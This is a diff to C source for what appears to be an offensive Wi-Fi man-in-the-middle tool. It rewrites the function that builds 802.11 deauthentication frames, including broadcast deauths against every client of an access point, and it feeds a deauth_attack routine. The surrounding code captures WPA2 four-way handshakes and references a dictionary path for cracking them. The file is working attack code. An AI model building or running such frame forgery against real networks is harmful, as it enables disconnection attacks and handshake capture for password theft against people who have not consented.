@@ -28,6 +28,20 @@ static int parse_auth_data(const char *buf, size_t len,
 	return 0;
 }
 
+uint16_t parse_subtype(uint16_t value) {
+    uint16_t subtype = value & subtype_mask;
+    uint16_t type    = value & type_mask;
+    uint16_t version = value & version_mask;
+    return subtype >> 12 | type >> 6 | version;
+}
+
+uint16_t construct_frame_control(uint8_t version, enum ieee80211_type type, 
+                                    enum ieee80211_subtype subtype, enum IEEE80211_FLAGS flags) {
+    uint16_t frame_control;
+    frame_control = subtype << 12 | type << 10 | version << 8 | flags;
+    return htons(frame_control);
+}
+
 static int fill_encry_info(const char *dict_path, enum MITM_state *state, struct encrypto_info * info, 
 		const struct WPA2_handshake_packet *packet) {
 	/* XXX : How to make sure the handshake packet is the same process ? */
@@ -202,7 +216,7 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 	return;
 }
 
-int prepare_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
+static int construct_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
 	int is_broadcast = 0;
 	if (!buffer || !ap) {
 		log_printf(MSG_WARNING, "[%s]buffer or ap not exist");
@@ -210,48 +224,37 @@ int prepare_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_
 	}
 	if (!victim) 
 		is_broadcast = 1;
-	struct ieee80211_radiotap_header radiotap_hdr;
+	memset(buffer, 0, *pkt_len);
+    struct ieee80211_radiotap_header radiotap_hdr;
 	memset(&radiotap_hdr, 0, sizeof(struct ieee80211_radiotap_header));
 	radiotap_hdr.it_version = 0;
 	radiotap_hdr.it_pad = 0;
-	radiotap_hdr.it_len = 26;
-	radiotap_hdr.it_present = htonl(IEEE80211_RADIOTAP_RATE);
-//	radiotap_hdr.padload = 0x02;
-	radiotap_hdr.padload = malloc(sizeof(uint8_t) * 18);
-	*radiotap_hdr.padload++ = 0x7b;
-	*radiotap_hdr.padload++ = 0x35;
-	*radiotap_hdr.padload++ = 0x4f;
-	*radiotap_hdr.padload++ = 0x21;
-	*radiotap_hdr.padload++ = 0x00;
-	*radiotap_hdr.padload++ = 0x00;
-	*radiotap_hdr.padload++ = 0x00;
-	*radiotap_hdr.padload++ = 0x00;
-	*radiotap_hdr.padload++ = 0x40;
-	*radiotap_hdr.padload++ = 0x30;
-	*radiotap_hdr.padload++ = 0xad;
-	*radiotap_hdr.padload++ = 0x16;
-	*radiotap_hdr.padload++ = 0x40;
-	*radiotap_hdr.padload++ = 0x01;
-	*radiotap_hdr.padload++ = 0xac;
-	*radiotap_hdr.padload++ = 0x00;
-	*radiotap_hdr.padload++ = 0x00;
-	*radiotap_hdr.padload = 0x00;
-
-	struct ieee80211_hdr_3addr deauth;
+	radiotap_hdr.it_len = sizeof(struct ieee80211_radiotap_header) + 1;
+	radiotap_hdr.it_present |= (1 << IEEE80211_RADIOTAP_RATE);
+    memcpy(buffer, &radiotap_hdr, sizeof(struct ieee80211_radiotap_header));
+    *pkt_len = sizeof(struct ieee80211_radiotap_header);
+    // Data Rate 1 Byte : 1 mb/s
+    buffer[*pkt_len] = 0x02;
+    *pkt_len = *pkt_len + 1;
+    struct ieee80211_hdr_3addr deauth;
 	memset(&deauth, 0, sizeof(struct ieee80211_hdr_3addr));
-	deauth.frame_control = htons(0xc111);
-	if (is_broadcast) 
-		memset(deauth.addr2, 0xff, ETH_ALEN);
+	deauth.frame_control = construct_frame_control(0, IEEE80211_MANAGMENT_TYPE,
+                                    IEEE80211_DEAUTHENTICATION, IEEE80211_FLAGS_RETRY);
+	
+    deauth.duration_id = 0x3a01; /* duration time : 314 ms. */
+    if (is_broadcast) 
+		memset(deauth.addr1, 0xff, ETH_ALEN);
 	else 
-		memcpy(deauth.addr2, victim, ETH_ALEN);
-	memcpy(deauth.addr1, ap, ETH_ALEN);
+		memcpy(deauth.addr1, victim, ETH_ALEN);
+	memcpy(deauth.addr2, ap, ETH_ALEN);
 	memcpy(deauth.addr3, ap, ETH_ALEN);
 	deauth.seq_ctrl = htons(seq_num);
 
-	*pkt_len = radiotap_hdr.it_len + sizeof(deauth);
-	memcpy(buffer, &radiotap_hdr, radiotap_hdr.it_len);
+	*pkt_len += sizeof(deauth);
 	memcpy(buffer + radiotap_hdr.it_len, &deauth, sizeof(deauth));
-	buffer[*pkt_len++] = htons(deauth_unspec_reason);
+	*(uint16_t*)&buffer[*pkt_len] = deauth_unspec_reason;
+    *pkt_len = *pkt_len + 2;
+    return 0;
 }
 
 void deauth_attack(void *eloop_data, void *user_ctx) {
@@ -263,7 +266,7 @@ void deauth_attack(void *eloop_data, void *user_ctx) {
 	if (!packet)
 		return;
 	/* XXX : I am not really sure how to define the seqence num of packet */
-	ret = prepare_deauth_pkt(packet, &pkt_len, NULL, MITM->encry_info.AA, 9500);
+	ret = construct_deauth_pkt(packet, &pkt_len, NULL, MITM->encry_info.AA, 9500);
 	if (ret < 0) {
 		log_printf(MSG_WARNING, "[Deauth]Prepare deauthentication packet failed.");
 	}
